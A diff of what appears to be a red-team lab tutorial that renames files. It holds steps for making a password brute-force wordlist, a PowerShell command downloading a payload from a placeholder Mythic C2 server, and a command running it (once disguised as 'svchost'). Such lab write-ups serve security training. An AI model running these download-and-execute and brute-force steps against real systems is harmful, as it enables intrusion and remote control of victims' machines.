@@ -46,9 +46,9 @@ Before jumping into the action, let’s set up our environment. I’m using **Vu
     ```bash
     cd /usr/share/wordlists
     ```
-2. Use the first 50 lines of the `rockyou.txt` wordlist to create a smaller list:
+2. Use the first 50 lines of the `brute.txt` wordlist to create a smaller list:
     ```bash
-    head -50 rockyou.txt > /home/kali/aurora-wordlist.txt
+    head -50 brute.txt > /home/kali/aurora-wordlist.txt
     ```
 3. Edit the wordlist and insert the real password for proof of concept:
     ```bash
@@ -127,12 +127,12 @@ Before jumping into the action, let’s set up our environment. I’m using **Vu
 
 1. Download the payload using PowerShell:
     ```powershell
-    Invoke-WebRequest -Uri http://[Mythic-Server-IP]:9999/svchost-aurorarocks.exe -Outfile "C:\Users\Public\downloads\svchost-aurorarocks.exe"
+    Invoke-WebRequest -Uri http://[Mythic-Server-IP]:9999/svc-aurora.exe -Outfile "C:\Users\Public\downloads\svc-aurora.exe"
     ```
 
 2. Execute the payload:
     ```powershell
-    .\svchost-aurorarocks.exe
+    .\svc-aurora.exe
     ```
 
 ### Phase 5: Command & Control — Establishing a C2 Session
